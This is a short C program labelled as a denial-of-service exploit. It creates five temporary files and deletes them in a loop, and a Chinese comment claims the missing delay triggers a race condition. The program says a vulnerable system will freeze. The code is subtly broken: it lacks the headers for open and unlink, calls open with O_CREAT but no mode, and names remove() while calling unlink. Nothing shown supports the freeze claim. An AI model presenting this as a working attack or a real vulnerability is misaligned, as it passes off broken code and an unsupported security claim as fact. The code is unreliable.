#include "stdio.h"

int main(int argc, char *argv[])
{
    int i;
    char buf[32];
    
    printf("Exploit: DoS via remove() loop\n");
    printf("Creating temporary files...\n");

    for(i=0; i<5; i++) {
        sprintf(buf, "tmp%d", i);
        int fd = open(buf, O_CREAT | O_RDWR);
        if (fd != -1) {
            write(fd, "test", 4);
            close(fd);
        } else {
            printf("Failed to create %s\n", buf);
        }
    }

    printf("Attempting to delete files in sequence...\n");
    printf("System should FREEZE during this loop if vulnerable.\n");
    
    for(i=0; i<5; i++) {
        sprintf(buf, "tmp%d", i);
        printf("Deleting %s...\n", buf);
        if(unlink(buf) != 0) {
            printf("Failed to unlink %s\n", buf);
        }
        /* 这里没有延时，触发竞态条件/bug */
    }

    printf("If you see this, the system did NOT crash.\n");
    return 0;
}
